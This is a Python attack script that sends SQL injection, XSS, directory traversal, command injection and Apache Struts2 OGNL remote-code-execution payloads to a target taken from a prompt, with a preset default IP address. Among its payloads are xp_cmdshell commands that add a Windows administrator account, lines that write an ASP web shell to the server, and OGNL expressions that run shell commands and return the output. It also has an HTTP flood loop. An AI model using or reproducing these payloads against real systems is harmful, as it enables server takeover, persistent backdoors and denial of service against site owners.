import requests
from random import randint
import time

class AttackPayload(object):
	sql_inject = [
		"and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell') ",
		';exec master..xp_cmdshell "net user name password /add"-- ',
		';exec master..xp_cmdshell "net localgroup name administrators /add"-- ',
		"and (select IS_SRVROLEMEMBER('sysadmin'))=1-- ",
		";exec master.dbo.sp_addsrvrolemember name,sysadmin;",
		"execute master..sp_msgetversion",
		"execute master..xp_enumgroups",
		"and 1=(select count(*) from admin where len(password)>11) ",
		"group by users.id having 1=1--",
		"UNION Select TOP 1 COLUMN_blank>_NAME FROM INFORMATION_blank>_SCHEMA.COLUMNS Where TABLE_blank>_NAME=logintable-",
		"and 1=(select name from master.dbo.sysdatabases where dbid=7)--",
	]
	xss_inject = [
		"<script>alert('hello，gaga!');</script>" ,
		""">"'><img src="javascript.:alert('XSS')">""",
		"<table background='javascript.:alert(([code])'></table>",
		"='><script>alert(document.cookie)</script>",
		"%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e",
		"""<IMG SRC="jav&#x0A;ascript.:alert('XSS');">""",
		""""<IMG src="/java"\0script.:alert(\"XSS\")>";'>out""",
		"""<FRAMESET><FRAME. src="/javascript.:alert"('XSS')></FRAME></FRAMESET>""",
		"""<STYLE. TYPE="text/javascript">alert('XSS');</STYLE>""",
		"<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>",
	]

	Directory_Traversal = [
		"?view=../../../../../Windows/system.ini",
	]

	cmd_inject = [
		"""1881;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:/mu.asp';-- """,
		"""echo ^<%execute^(request^("l"^)^)%^> >c:/mu.asp""",
		"and 1=(select @@VERSION) ",
		"1=convert(int,@@version)--",
		"and 1=(select count(*) FROM master.dbo.sysobjects where xtype = 'X' AND name = 'xp_cmdshell')",
	]
	st2 = [
		"=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')",
		"foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&z[%28foo%29%28%27meh%27%29]=true",
		"class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(false)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&x[(class.classLoader.jarPath)('aa')]",
		"class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(false),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().exec(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]&cmd=cmd%20/c%20netstat%20-an",
		"ONGL"
	]
	un_HTTP_req = [
		"GET",
		"OPTIONS",
		"POST",
		"PUT",
		"PATCH",
		"DELETE",
		"HEAD"
	]

class Attack(object):
	"""docstring for attack"""
	def __init__(self, method, target, time):
		# super(attack, self).__init__()
		self.method = method
		self.target = target
		self.time = time

	def sqli(self):
		for i in range(self.time):
			target = 'http://' + self.target + '?id=1'
			response = requests.get(target + AttackPayload.sql_inject[randint(0, len(AttackPayload.sql_inject)) - 1])
			time.sleep(1)
			print( AttackPayload.sql_inject[randint(0, len(AttackPayload.sql_inject)) - 1])
			print("seem done" + str(response.status_code))
		print("sqli done" )

	def xssi(self):
		for i in range(self.time):
			response = requests.get('http://' + self.target + '?id=1' + AttackPayload.xss_inject[randint(0, len(AttackPayload.xss_inject) - 1)])	
			time.sleep(1)
			print(AttackPayload.xss_inject[randint(0, len(AttackPayload.xss_inject) - 1)])
			print("seem done" + str(response.status_code))
		print("xssi done" )

	def dir_traver(self):
		for i in range(self.time):
			req = requests.get('http://' + self.target + '?id=1' + AttackPayload.Directory_Traversal[randint(0, len(AttackPayload.Directory_Traversal) - 1)])			
			time.sleep(1)
			print("seem done " + str(req.status_code))
			print(AttackPayload.Directory_Traversal[randint(0, len(AttackPayload.Directory_Traversal) - 1)])
		print("dir_traver done" )

	def cc(self):
		for i in range(100):
			req = requests.get('http://' + self.target)
			print("seem done " + str(req.status_code))
		print("cc done" )

	def cmdi(self):
		for i in range(self.time):
			req = requests.get('http://' + self.target + '?id=1' + AttackPayload.cmd_inject[randint(0, len(AttackPayload.cmd_inject) - 1 )])
			time.sleep(1)
			print("seem done " + str(req.status_code))
			print(AttackPayload.cmd_inject[randint(0, len(AttackPayload.cmd_inject) - 1 )])
		print("cmdi done" )

	def un_HTTP_req(self):
		for i in range(self.time):
			req = requests.request(AttackPayload.un_HTTP_req[randint(0, len(AttackPayload.un_HTTP_req) - 1)], 'http://' + self.target)
			print(req.status_code)
		print("un_HTTP_req done")
	def st2(self):
		for i in range(self.time):
			j = randint(0, len(AttackPayload.st2) - 1)
			if j == len(AttackPayload.st2) - 1:
				header = {}
				header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
				header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
				req = requests.get('http://' + self.target + '?id=1', headers=header)
			else:
				req = requests.get('http://' + self.target + '?id=1' + AttackPayload.st2[j])
			time.sleep(1)
			print(j)
			print(AttackPayload.st2[j])
			print("seem done " + str(req.status_code))
			# print(AttackPayload.cmd_inject[randint(0, len(AttackPayload.cmd_inject) - 1 )])
		print("st2 done" )

	def exploit(self):
		if self.method == "all":
			self.time = int(self.time / 5)
			self.sqli()
			self.xssi()
			self.dir_traver()
			self.cmdi()
			self.st2()
			# self.cc()
			self.un_HTTP_req()
			self.st2()
		elif self.method == "sqli":
			self.sqli()
		elif self.method == "xssi":
			self.xssi()
		elif self.method == "cmdi":
			self.cmdi()
		elif self.method == "cc":
			self.cc()
		elif self.method == "st2":
			self.st2()
		elif self.method == "dir_traver":
			self.dir_traver()

if __name__ == '__main__':
	target = input("请输入攻击目标：（默认211.64.28.102）")
	if target == "":
		target = "211.64.28.102"
	method = input("请输入攻击类型：（默认为all）")
	if method == "":
		method = "all"
	times = (input("请输入攻击次数："))
	if times == "":
		times = 100
	times = int(times)
	attack = Attack(method, target, times)
	attack.exploit()
	
